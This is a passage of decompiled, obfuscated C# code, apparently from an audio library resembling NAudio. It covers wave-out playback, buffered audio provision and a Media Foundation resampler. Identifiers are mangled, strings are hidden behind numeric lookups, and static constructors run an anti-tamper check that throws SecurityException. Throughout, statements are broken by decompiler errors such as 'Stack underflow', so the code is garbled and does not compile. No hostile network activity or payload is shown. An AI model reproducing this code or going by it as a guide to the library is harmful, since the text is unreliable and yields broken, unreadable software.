			: this((SynchronizationContext.Current == null) ? new global::_000E._000E(_001B._0007._0001, IntPtr.Zero) : new global::_000E._000E(_001B._0007._0002, IntPtr.Zero))
		{
		}

		public _0004(IntPtr _008B_008F_0006)
			: this(global::_0011._0018._0001(_008B_008F_0006))
		{
		}

		public _0004(global::_000E._000E _008C_008F_0006)
		{
			this._0001 = SynchronizationContext.Current;
			DeviceNumber = 0;
			DesiredLatency = 300;
			NumberOfBuffers = 2;
			this.m__0001 = _0001;
			this._0001 = new object();
			this.m__0001 = _008C_008F_0006;
			global::_0011._0018._0001(this.m__0001, _008C_008F_0006);
		}

		public void _0001(_001C._0004 _0002)
		{
			//IL_00ef: Incompatible stack heights: 0 vs 1
			//IL_00f5: Incompatible stack heights: 0 vs 1
			//IL_00fb: Incompatible stack heights: 0 vs 1
			((_0004)/*Error near IL_000f: Stack underflow*/).m__0001 = (_001C._0004)/*Error near IL_000f: Stack underflow*/;
			int num = global::_0011._0018._0001(((_001C._0004)/*Error near IL_0019: Stack underflow*/).WaveFormat, (DesiredLatency + NumberOfBuffers - 1) / NumberOfBuffers);
			object obj = this._0001;
			_0091_0002._009C_0005(obj);
			MmResult mmResult;
			try
			{
				global::_000E._000E obj2 = this.m__0001;
				ref IntPtr reference = ref this._0001;
				int num2 = DeviceNumber;
				global::_0005._0005 obj3 = this.m__0001.WaveFormat;
				global::_0017._0008._0003 obj4 = this.m__0001;
				mmResult = global::_0011._0018._0001(out reference, obj3, num2, obj2, obj4);
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
			global::_0011._0018._0001(mmResult, _0080._0014._0001(107388296));
			this._0001 = new global::_0007._0007[NumberOfBuffers];
			this._0001 = _001C._0005._0001;
			for (int i = 0; i < NumberOfBuffers; i++)
			{
				this._0001[i] = new global::_0007._0007(this._0001, num, this.m__0001, this._0001);
			}
		}

		public void _0001()
		{
			//IL_003f: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_0045: Incompatible stack heights: 0 vs 1
			if (((_0004)/*Error near IL_0009: Stack underflow*/)._0001 == _001C._0005._0001)
			{
				((_0004)/*Error near IL_0015: Stack underflow*/)._0001 = _001C._0005._0002;
				global::_0011._0018._0001((_0004)/*Error near IL_001c: Stack underflow*/);
			}
			else if (this._0001 == _001C._0005._0003)
			{
				global::_0011._0018._0001(this);
				global::_0011._0018._0001(this);
				this._0001 = _001C._0005._0002;
			}
		}

		public void _0003()
		{
			//IL_0059: Incompatible stack heights: 0 vs 1
			//IL_005c: Incompatible stack heights: 0 vs 1
			//IL_005f: Incompatible stack heights: 0 vs 1
			if (((_0004)/*Error near IL_0009: Stack underflow*/)._0001 == _001C._0005._0002)
			{
				((_0004)/*Error near IL_0016: Stack underflow*/)._0001 = _001C._0005._0003;
				object obj = ((_0004)/*Error near IL_001d: Stack underflow*/)._0001;
				_0091_0002._009C_0005(obj);
				MmResult mmResult;
				try
				{
					mmResult = global::_0011._0018._0001(this._0001);
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
				if (mmResult != 0)
				{
					throw new global::_0013._0001(mmResult, _0080._0014._0001(107388311));
				}
			}
		}

		public void _0002()
		{
			//IL_006c: Incompatible stack heights: 0 vs 1
			//IL_0072: Incompatible stack heights: 0 vs 1
			//IL_0075: Incompatible stack heights: 0 vs 1
			if (((_0004)/*Error near IL_0009: Stack underflow*/)._0001 != 0)
			{
				((_0004)/*Error near IL_0015: Stack underflow*/)._0001 = _001C._0005._0001;
				object obj = ((_0004)/*Error near IL_001c: Stack underflow*/)._0001;
				_0091_0002._009C_0005(obj);
				MmResult mmResult;
				try
				{
					mmResult = global::_0011._0018._0001(this._0001);
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
				if (mmResult != 0)
				{
					throw new global::_0013._0001(mmResult, _0080._0014._0001(107388262));
				}
				if (this.m__0001.Strategy == _001B._0007._0001)
				{
					global::_0011._0018._0001((Exception)null, this);
				}
			}
		}

		public long _0001()
		{
			//IL_00a7: Incompatible stack heights: 0 vs 1
			//IL_00b3: Incompatible stack heights: 0 vs 2
			object obj = ((_0004)/*Error near IL_000a: Stack underflow*/)._0001;
			_ = _0091_0002._009C_0005;
			/*Error near IL_001e: Stack underflow*/((object)/*Error near IL_001e: Stack underflow*/);
			try
			{
				global::_0012._0001 obj2 = default(global::_0012._0001);
				obj2._0001 = 4u;
				global::_0011._0018._0001(global::_0011._0018._0001(this._0001, out obj2, _0098._0089_0004(obj2)), _0080._0014._0001(107388277));
				if (obj2._0001 != 4)
				{
					throw new Exception(_009D._0093_0004(_0080._0014._0001(107388252), 4, obj2._0001));
				}
				return obj2._0004;
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		public void _0004()
		{
			//IL_0013: Incompatible stack heights: 0 vs 2
			//IL_001d: Incompatible stack heights: 0 vs 1
			_ = _0091_0002._009B_0005;
			/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/);
			((_0004)/*Error near IL_0011: Stack underflow*/)._0001(_0002: true);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0004();
		}

		protected void _0001(bool _0002)
		{
			//IL_0086: Incompatible stack heights: 0 vs 1
			//IL_0096: Incompatible stack heights: 0 vs 1
			((_0004)/*Error near IL_0090: Stack underflow*/)._0002();
			if ((int)/*Error near IL_0011: Stack underflow*/ != 0 && this._0001 != null)
			{
				for (int i = 0; i < this._0001.Length; i++)
				{
					if (this._0001[i] != null)
					{
						this._0001[i]._0002();
					}
				}
				this._0001 = null;
			}
			object obj = this._0001;
			_0091_0002._009C_0005(obj);
			try
			{
				global::_0011._0018._0001(this._0001);
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
			if (_0002)
			{
				global::_0011._0018._0001(this.m__0001);
			}
		}

		protected override void _0005()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			try
			{
				((_0004)/*Error near IL_000f: Stack underflow*/)._0001(_0002: false);
			}
			finally
			{
				global::_0008._009E(this);
			}
		}

		private void _0001(IntPtr _0002, global::_0017._0008._0002 _0003, IntPtr _0004, _007F._0006 _0005, IntPtr _0006)
		{
			//IL_000a: Invalid comparison between Unknown and I4
			//IL_00ba: Incompatible stack heights: 0 vs 1
			//IL_00c1: Incompatible stack heights: 0 vs 2
			//IL_00cb: Incompatible stack heights: 0 vs 1
			if ((int)/*Error near IL_000f: Stack underflow*/ != 957)
			{
				return;
			}
			_ = _009A_0002._0012_0006;
			IntPtr intPtr = ((_007F._0006)/*Error near IL_001e: Stack underflow*/)._0002;
			/*Error near IL_00cb: Stack underflow*/(intPtr);
			global::_0007._0007 obj = (global::_0007._0007)((GCHandle)/*Error near IL_0023: Stack underflow*/).Target;
			_0006_0003._0083_0006(ref this._0001);
			Exception ex = null;
			if (PlaybackState == _001C._0005._0002)
			{
				object obj2 = this._0001;
				_0091_0002._009C_0005(obj2);
				try
				{
					if (global::_0011._0018._0001(obj))
					{
						_0006_0003._0084_0006(ref this._0001);
					}
				}
				catch (Exception ex2)
				{
					ex = ex2;
				}
				finally
				{
					_0091_0002._009D_0005(obj2);
				}
			}
			if (this._0001 == 0 && (this.m__0001.Strategy != 0 || this._0001 != 0))
			{
				this._0001 = _001C._0005._0001;
				global::_0011._0018._0001(ex, this);
			}
		}
	}
}
namespace _0019
{
	internal sealed class _0005 : IDisposable, global::_0010._0006, global::_001F._0006
	{
		[CompilerGenerated]
		internal sealed class _0001
		{
			public EventHandler<global::_0003._0003> _0001;

			public Exception _0001;

			public _0005 _0001;

			internal void _0001(object _0002)
			{
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 2
				//IL_0027: Incompatible stack heights: 0 vs 2
				_ = ((_0001)/*Error near IL_0007: Stack underflow*/)._0001;
				_ = ((_0001)/*Error near IL_000e: Stack underflow*/)._0001;
				global::_0003._0003 e = new global::_0003._0003(((_0001)/*Error near IL_0015: Stack underflow*/)._0001);
				/*Error near IL_001f: Stack underflow*/((object?)/*Error near IL_001f: Stack underflow*/, e);
			}
		}

		internal readonly object _0001;

		internal readonly SynchronizationContext _0001;

		internal IntPtr _0001;

		internal global::_0007._0007[] _0001;

		private global::_001C._0004 m__0001;

		internal volatile global::_001C._0005 _0001;

		internal AutoResetEvent _0001;

		private float m__0001 = 1f;

		[CompilerGenerated]
		internal EventHandler<global::_0003._0003> _0001;

		[CompilerGenerated]
		private int m__0001;

		[CompilerGenerated]
		private int m__0002;

		[CompilerGenerated]
		private int m__0003;

		public int DesiredLatency
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0005)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0005)/*Error near IL_0009: Stack underflow*/).m__0001 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int NumberOfBuffers
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0005)/*Error near IL_0007: Stack underflow*/).m__0002;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0005)/*Error near IL_0009: Stack underflow*/).m__0002 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public int DeviceNumber
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0005)/*Error near IL_0007: Stack underflow*/).m__0003;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0005)/*Error near IL_0009: Stack underflow*/).m__0003 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public global::_0005._0005 OutputWaveFormat
		{
			get
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_0012: Incompatible stack heights: 0 vs 1
				_ = ((_0005)/*Error near IL_0007: Stack underflow*/).m__0001.WaveFormat;
				return (global::_0005._0005)/*Error near IL_000a: Stack underflow*/;
			}
		}

		public global::_001C._0005 PlaybackState => ((_0005)/*Error near IL_0009: Stack underflow*/)._0001;

		public float Volume
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0005)/*Error near IL_0007: Stack underflow*/).m__0001;
			}
			set
			{
				//IL_0024: Incompatible stack heights: 0 vs 1
				//IL_002a: Incompatible stack heights: 0 vs 1
				IntPtr intPtr = ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;
				IntPtr intPtr2 = default(IntPtr);
				if (0 == 0)
				{
					intPtr2 = intPtr;
				}
				object obj = ((_0005)/*Error near IL_0012: Stack underflow*/)._0001;
				global::_0011._0018._0001(obj, value, intPtr2);
				this.m__0001 = value;
			}
		}

		public event EventHandler<global::_0003._0003> PlaybackStopped
		{
			[CompilerGenerated]
			add
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0003._0003> eventHandler = ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler<global::_0003._0003> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0003._0003>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0003._0003> value2 = (EventHandler<global::_0003._0003>)Delegate.Combine(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
			[CompilerGenerated]
			remove
			{
				//IL_002d: Incompatible stack heights: 0 vs 1
				//IL_0033: Incompatible stack heights: 0 vs 1
				EventHandler<global::_0003._0003> eventHandler = ((_0005)/*Error near IL_0007: Stack underflow*/)._0001;
				EventHandler<global::_0003._0003> eventHandler2;
				do
				{
					eventHandler2 = (EventHandler<global::_0003._0003>)/*Error near IL_000c: Stack underflow*/;
					EventHandler<global::_0003._0003> value2 = (EventHandler<global::_0003._0003>)Delegate.Remove(eventHandler2, value);
					eventHandler = Interlocked.CompareExchange(ref this._0001, value2, eventHandler2);
				}
				while ((object)eventHandler != eventHandler2);
			}
		}

		public _0005()
		{
			this._0001 = SynchronizationContext.Current;
			if (this._0001 != null && (this._0001.GetType().Name == global::_0080._0014._0001(107387631) || this._0001.GetType().Name == global::_0080._0014._0001(107387614)))
			{
				this._0001 = null;
			}
			DeviceNumber = 0;
			DesiredLatency = 300;
			NumberOfBuffers = 2;
			this._0001 = new object();
		}

		public void _0001(global::_001C._0004 _0002)
		{
			//IL_013e: Incompatible stack heights: 0 vs 1
			//IL_0148: Incompatible stack heights: 0 vs 1
			//IL_0152: Incompatible stack heights: 0 vs 1
			if (((_0005)/*Error near IL_000c: Stack underflow*/)._0001 != 0)
			{
				global::_0080._0014._0001(107387573);
				new InvalidOperationException((string?)/*Error near IL_0152: Stack underflow*/);
				throw /*Error near IL_001e: Stack underflow*/;
			}
			if (_0090_0002._0099_0005(this._0001, IntPtr.Zero))
			{
				global::_0011._0018._0001(this);
				global::_0011._0018._0001(this);
			}
			this._0001 = new AutoResetEvent(initialState: false);
			this.m__0001 = _0002;
			int num = global::_0011._0018._0001(_0002.WaveFormat, (DesiredLatency + NumberOfBuffers - 1) / NumberOfBuffers);
			object obj = this._0001;
			_0091_0002._009C_0005(obj);
			MmResult mmResult;
			try
			{
				mmResult = global::_0011._0018._0001(out this._0001, _0099._008E_0004(DeviceNumber), this.m__0001.WaveFormat, _0096_0002._007E_0006_0006(_0095_0002._007E_0005_0006(this._0001)), IntPtr.Zero, global::_0017._0008._0001._0003);
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
			global::_0011._0018._0001(mmResult, global::_0080._0014._0001(107388296));
			this._0001 = new global::_0007._0007[NumberOfBuffers];
			this._0001 = global::_001C._0005._0001;
			for (int i = 0; i < NumberOfBuffers; i++)
			{
				this._0001[i] = new global::_0007._0007(this._0001, num, this.m__0001, this._0001);
			}
		}

		public void _0001()
		{
			//IL_0086: Incompatible stack heights: 0 vs 1
			//IL_008c: Incompatible stack heights: 0 vs 1
			//IL_0096: Incompatible stack heights: 0 vs 1
			if (((_0005)/*Error near IL_000a: Stack underflow*/)._0001 == null || ((_0005)/*Error near IL_0016: Stack underflow*/).m__0001 == null)
			{
				global::_0080._0014._0001(107387492);
				throw new InvalidOperationException((string?)/*Error near IL_0024: Stack underflow*/);
			}
			if (this._0001 == global::_001C._0005._0001)
			{
				this._0001 = global::_001C._0005._0002;
				global::_001B._007E_0084_0003(this._0001);
				_0097_0002._000E_0006(delegate
				{
					//IL_0006: Incompatible stack heights: 0 vs 1
					global::_0011._0018._0001((_0005)/*Error near IL_000d: Stack underflow*/);
				}, null);
			}
			else if (this._0001 == global::_001C._0005._0003)
			{
				global::_0011._0018._0001(this);
				global::_001B._007E_0084_0003(this._0001);
			}
		}

		public void _0003()
		{
			//IL_0059: Incompatible stack heights: 0 vs 1
			//IL_005c: Incompatible stack heights: 0 vs 1
			//IL_005f: Incompatible stack heights: 0 vs 1
			if (((_0005)/*Error near IL_0009: Stack underflow*/)._0001 == global::_001C._0005._0002)
			{
				((_0005)/*Error near IL_0016: Stack underflow*/)._0001 = global::_001C._0005._0003;
				object obj = ((_0005)/*Error near IL_001d: Stack underflow*/)._0001;
				_0091_0002._009C_0005(obj);
				MmResult mmResult;
				try
				{
					mmResult = global::_0011._0018._0001(this._0001);
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
				if (mmResult != 0)
				{
					throw new global::_0013._0001(mmResult, global::_0080._0014._0001(107388311));
				}
			}
		}

		public void _0002()
		{
			//IL_0069: Incompatible stack heights: 0 vs 1
			//IL_006c: Incompatible stack heights: 0 vs 1
			//IL_006f: Incompatible stack heights: 0 vs 1
			if (((_0005)/*Error near IL_0009: Stack underflow*/)._0001 != 0)
			{
				((_0005)/*Error near IL_0015: Stack underflow*/)._0001 = global::_001C._0005._0001;
				object obj = ((_0005)/*Error near IL_001c: Stack underflow*/)._0001;
				_0091_0002._009C_0005(obj);
				MmResult mmResult;
				try
				{
					mmResult = global::_0011._0018._0001(this._0001);
				}
				finally
				{
					_0091_0002._009D_0005(obj);
				}
				if (mmResult != 0)
				{
					throw new global::_0013._0001(mmResult, global::_0080._0014._0001(107388262));
				}
				global::_001B._007E_0084_0003(this._0001);
			}
		}

		public long _0001()
		{
			//IL_00a7: Incompatible stack heights: 0 vs 1
			//IL_00b3: Incompatible stack heights: 0 vs 2
			object obj = ((_0005)/*Error near IL_000a: Stack underflow*/)._0001;
			_ = _0091_0002._009C_0005;
			/*Error near IL_001e: Stack underflow*/((object)/*Error near IL_001e: Stack underflow*/);
			try
			{
				global::_0012._0001 obj2 = default(global::_0012._0001);
				obj2._0001 = 4u;
				global::_0011._0018._0001(global::_0011._0018._0001(this._0001, out obj2, _0098._0089_0004(obj2)), global::_0080._0014._0001(107388277));
				if (obj2._0001 != 4)
				{
					throw new Exception(_009D._0093_0004(global::_0080._0014._0001(107388252), 4, obj2._0001));
				}
				return obj2._0004;
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		public void _0004()
		{
			//IL_0013: Incompatible stack heights: 0 vs 2
			//IL_001d: Incompatible stack heights: 0 vs 1
			_ = _0091_0002._009B_0005;
			/*Error near IL_001a: Stack underflow*/((object)/*Error near IL_001a: Stack underflow*/);
			((_0005)/*Error near IL_0011: Stack underflow*/)._0001(_0002: true);
		}

		void IDisposable.Dispose()
		{
			//ILSpy generated this explicit interface implementation from .override directive in 
			this._0004();
		}

		protected void _0001(bool _0002)
		{
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_0020: Incompatible stack heights: 0 vs 1
			((_0005)/*Error near IL_001d: Stack underflow*/)._0002();
			if ((int)/*Error near IL_0008: Stack underflow*/ != 0)
			{
				global::_0011._0018._0001(this);
			}
			global::_0011._0018._0001(this);
		}

		protected override void _0005()
		{
			//IL_0008: Incompatible stack heights: 0 vs 1
			try
			{
				((_0005)/*Error near IL_000f: Stack underflow*/)._0001(_0002: false);
			}
			finally
			{
				global::_0008._009E(this);
			}
		}

		[CompilerGenerated]
		private void _0001(object _0002)
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0005)/*Error near IL_000d: Stack underflow*/);
		}

		static _0005()
		{
			//IL_00bb: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly;
			if (true)
			{
				assembly = (Assembly)/*Error near IL_00c1: Stack underflow*/;
			}
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), global::_0080._0014._0001(107396751), global::_0080._0014._0001(107396746)), global::_0080._0014._0001(107396741), global::_0080._0014._0001(107396736)));
			if (global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) && flag && global::_0004._007E_0081(global::_0002._007E_0004(assembly), global::_0080._0014._0001(107396763)))
			{
				return;
			}
			throw new SecurityException(global::_0080._0014._0001(107396706));
		}
	}
}
namespace _0002
{
	internal sealed class _0008 : global::_001C._0004
	{
		internal global::_0019._0010 _0001;

		private readonly global::_0005._0005 _0001;

		[CompilerGenerated]
		private bool _0001;

		[CompilerGenerated]
		private int _0001;

		[CompilerGenerated]
		private bool _0002;

		public bool ReadFully
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0008)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0008)/*Error near IL_0009: Stack underflow*/)._0001 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
			}
		}

		public int BufferLength
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0008)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0008)/*Error near IL_0009: Stack underflow*/)._0001 = (int)/*Error near IL_0009: Stack underflow*/;
			}
		}

		public TimeSpan BufferDuration
		{
			get
			{
				//IL_0017: Unknown result type (might be due to invalid IL or missing references)
				//IL_001d: Expected F8, but got Unknown
				//IL_001f: Incompatible stack heights: 0 vs 2
				//IL_0026: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 2
				_ = _0003_0003._007F_0006;
				_ = ((_0008)/*Error near IL_0026: Stack underflow*/).BufferLength;
				_ = (double)/*Error near IL_000a: Stack underflow*/;
				int num = ((_0008)/*Error near IL_0011: Stack underflow*/).WaveFormat._0002;
				_003F val = /*Error near IL_0018: Stack underflow*// (double)num;
				return /*Error near IL_001d: Stack underflow*/((double)val);
			}
			set
			{
				//IL_0013: Unknown result type (might be due to invalid IL or missing references)
				//IL_001c: Incompatible stack heights: 0 vs 1
				//IL_0023: Incompatible stack heights: 0 vs 1
				//IL_0026: Incompatible stack heights: 0 vs 1
				_ = value.TotalSeconds;
				int num = ((_0008)/*Error near IL_000d: Stack underflow*/).WaveFormat._0002;
				_003F val = /*Error near IL_0014: Stack underflow*/* (double)num;
				((_0008)/*Error near IL_001a: Stack underflow*/).BufferLength = (int)val;
			}
		}

		public bool DiscardOnBufferOverflow
		{
			[CompilerGenerated]
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0008)/*Error near IL_0007: Stack underflow*/)._0002;
			}
			[CompilerGenerated]
			set
			{
				//IL_000b: Incompatible stack heights: 0 vs 1
				//IL_000e: Incompatible stack heights: 0 vs 1
				((_0008)/*Error near IL_0009: Stack underflow*/)._0002 = (byte)/*Error near IL_0009: Stack underflow*/ != 0;
			}
		}

		public int BufferedBytes
		{
			get
			{
				//IL_0016: Incompatible stack heights: 0 vs 1
				//IL_0019: Incompatible stack heights: 0 vs 1
				//IL_0020: Incompatible stack heights: 0 vs 1
				if (((_0008)/*Error near IL_0007: Stack underflow*/)._0001 == null)
				{
					return 0;
				}
				_ = ((_0008)/*Error near IL_0010: Stack underflow*/)._0001.Count;
				return (int)/*Error near IL_0013: Stack underflow*/;
			}
		}

		public TimeSpan BufferedDuration
		{
			get
			{
				//IL_0017: Unknown result type (might be due to invalid IL or missing references)
				//IL_001d: Expected F8, but got Unknown
				//IL_001f: Incompatible stack heights: 0 vs 2
				//IL_0026: Incompatible stack heights: 0 vs 1
				//IL_0029: Incompatible stack heights: 0 vs 2
				_ = _0003_0003._007F_0006;
				_ = ((_0008)/*Error near IL_0026: Stack underflow*/).BufferedBytes;
				_ = (double)/*Error near IL_000a: Stack underflow*/;
				int num = ((_0008)/*Error near IL_0011: Stack underflow*/).WaveFormat._0002;
				_003F val = /*Error near IL_0018: Stack underflow*// (double)num;
				return /*Error near IL_001d: Stack underflow*/((double)val);
			}
		}

		public global::_0005._0005 WaveFormat => ((_0008)/*Error near IL_0007: Stack underflow*/)._0001;

		public _0008(global::_0005._0005 _0099_008F_0006)
		{
			this._0001 = _0099_008F_0006;
			BufferLength = _0099_008F_0006._0002 * 5;
			ReadFully = true;
		}

		public int Read(byte[] _0002, int _0003, int _0004)
		{
			//IL_0041: Incompatible stack heights: 0 vs 1
			//IL_0044: Incompatible stack heights: 0 vs 1
			int num = 0;
			if (((_0008)/*Error near IL_000a: Stack underflow*/)._0001 != null)
			{
				num = global::_0011._0018._0001(((_0008)/*Error near IL_0013: Stack underflow*/)._0001, _0002, _0003, _0004);
			}
			if (ReadFully && num < _0004)
			{
				_0007_0003._0086_0006(_0002, _0003 + num, _0004 - num);
				num = _0004;
			}
			return num;
		}
	}
}
namespace _001B
{
	internal sealed class _0008 : global::_0017._0019
	{
		internal new int _0001;

		private new static readonly Guid m__0001;

		private new static readonly Guid _0002;

		internal new _001C._000F _0001;

		public int ResamplerQuality
		{
			get
			{
				//IL_0009: Incompatible stack heights: 0 vs 1
				return ((_0008)/*Error near IL_0007: Stack underflow*/)._0001;
			}
			set
			{
				//IL_0003: Invalid comparison between Unknown and I4
				//IL_0009: Invalid comparison between Unknown and I4
				//IL_0021: Incompatible stack heights: 0 vs 1
				//IL_0024: Incompatible stack heights: 0 vs 1
				//IL_002b: Incompatible stack heights: 0 vs 1
				if ((int)/*Error near IL_0005: Stack underflow*/ < 1 || (int)/*Error near IL_000b: Stack underflow*/ > 60)
				{
					_0080._0014._0001(107387847);
					throw new ArgumentOutOfRangeException((string?)/*Error near IL_0017: Stack underflow*/);
				}
				this._0001 = value;
			}
		}

		public _0008(_001C._0004 _0002_0090_0006, global::_0005._0005 _0003_0090_0006)
			: base(_0002_0090_0006, _0003_0090_0006)
		{
			if (!global::_0011._0018._0001(_0002_0090_0006.WaveFormat))
			{
				throw new ArgumentException(_0080._0014._0001(107387463), _0080._0014._0001(107387450));
			}
			if (!global::_0011._0018._0001(_0003_0090_0006))
			{
				throw new ArgumentException(_0080._0014._0001(107387397), _0080._0014._0001(107387896));
			}
			global::_0011._0018._0001();
			ResamplerQuality = 60;
			object obj = global::_0011._0018._0001(this);
			global::_0011._0018._0001(this, obj);
		}

		private new object _0001()
		{
			//IL_0076: Incompatible stack heights: 0 vs 1
			//IL_0080: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001(global::_000E._0017._0008);
			((IEnumerable<_001C._000F>)/*Error near IL_0080: Stack underflow*/).GetEnumerator();
			IEnumerator<_001C._000F> enumerator = (IEnumerator<_001C._000F>)/*Error near IL_0086: Stack underflow*/;
			try
			{
				while (global::_001B._007E_0086_0003(enumerator))
				{
					_001C._000F current = enumerator.Current;
					current._0001(global::_0004._0011._0005, out Guid guid);
					if (guid.Equals(_0008.m__0001))
					{
						current._0001(_0002, out object result);
						this._0001 = current;
						return result;
					}
				}
			}
			finally
			{
				if (enumerator != null)
				{
					global::_0008._007E_0098(enumerator);
				}
			}
			return null;
		}

		public _0008(_001C._0004 _0002_0090_0006, int _0004_0090_0006)
			: this(_0002_0090_0006, global::_0011._0018._0001(_0002_0090_0006.WaveFormat, _0004_0090_0006))
		{
		}

		protected override global::_0010._0013 _0001()
		{
			//IL_0067: Incompatible stack heights: 0 vs 1
			//IL_006e: Incompatible stack heights: 0 vs 1
			global::_0011._0018._0001((_0008)/*Error near IL_006e: Stack underflow*/);
			object obj = (object)/*Error near IL_0071: Stack underflow*/;
			global::_0010._0013 obj2 = (global::_0010._0013)obj;
			global::_0019._0012 obj3 = global::_0011._0018._0001(base._0001.WaveFormat);
			obj2._0001(0, obj3, global::_0013._0013._0001);
			_0098._008A_0004(obj3);
			global::_0019._0012 obj4 = global::_0011._0018._0001(base._0001);
			obj2._0002(0, obj4, global::_0013._0013._0001);
			_0098._008A_0004(obj4);
			((global::_0004._0004)obj)._0001(this._0001);
			return obj2;
		}

		protected override void _0001(bool _0002)
		{
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_0025: Incompatible stack heights: 0 vs 1
			if (((_0008)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				((_0008)/*Error near IL_0010: Stack underflow*/)._0001._0004();
				this._0001 = null;
			}
			base._0001(_0002);
		}

		static _0008()
		{
			//IL_00e1: Incompatible stack heights: 0 vs 1
			bool flag = false;
			global::_0001._0001();
			Assembly assembly = (Assembly)/*Error near IL_00e7: Stack underflow*/;
			Uri uri = new Uri(global::_0003._007E_0080(global::_0003._007E_0080(global::_0002._007E_0002(assembly), _0080._0014._0001(107396751), _0080._0014._0001(107396746)), _0080._0014._0001(107396741), _0080._0014._0001(107396736)));
			if (!global::_0011._0018._0001(global::_0002._007E_0003(uri), true, out flag) || !flag || !global::_0004._007E_0081(global::_0002._007E_0004(assembly), _0080._0014._0001(107396763)))
			{
				throw new SecurityException(_0080._0014._0001(107396706));
			}
			_0008.m__0001 = new Guid(_0080._0014._0001(107387790));
			_0002 = new Guid(_0080._0014._0001(107387773));
		}
	}
}
namespace _0017
{
	internal abstract class _0019 : IDisposable, global::_001C._0004
	{
		protected internal readonly global::_001C._0004 _0001;

		protected readonly global::_0005._0005 _0001;

		internal readonly byte[] _0001;

		internal byte[] _0002;

		internal int _0001;

		internal int _0002;

		internal global::_0010._0013 _0001;

		private bool m__0001;

		internal long _0001;

		internal long _0002;

		internal bool _0002;

		public global::_0005._0005 WaveFormat => ((_0019)/*Error near IL_0007: Stack underflow*/)._0001;

		public _0019(global::_001C._0004 _0002_0090_0006, global::_0005._0005 _0003_0090_0006)
		{
			this._0001 = _0003_0090_0006;
			this._0001 = _0002_0090_0006;
			this._0001 = new byte[_0002_0090_0006.WaveFormat._0002];
			this._0002 = new byte[this._0001._0002 + this._0001.BlockAlign];
		}

		protected abstract global::_0010._0013 _0001();

		protected virtual void _0001(bool _0002)
		{
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 2
			//IL_0024: Incompatible stack heights: 0 vs 1
			if (((_0019)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				_ = _0098._008A_0004;
				global::_0010._0013 obj = ((_0019)/*Error near IL_0015: Stack underflow*/)._0001;
				/*Error near IL_0024: Stack underflow*/(obj);
			}
		}

		public void _0001()
		{
			//IL_0026: Incompatible stack heights: 0 vs 1
			//IL_0029: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 1
			if (!((_0019)/*Error near IL_0007: Stack underflow*/).m__0001)
			{
				((_0019)/*Error near IL_0011: Stack underflow*/).m__0001 = true;
				((_0019)/*Error near IL_0019: Stack underflow*/)._0001(_0002: true);
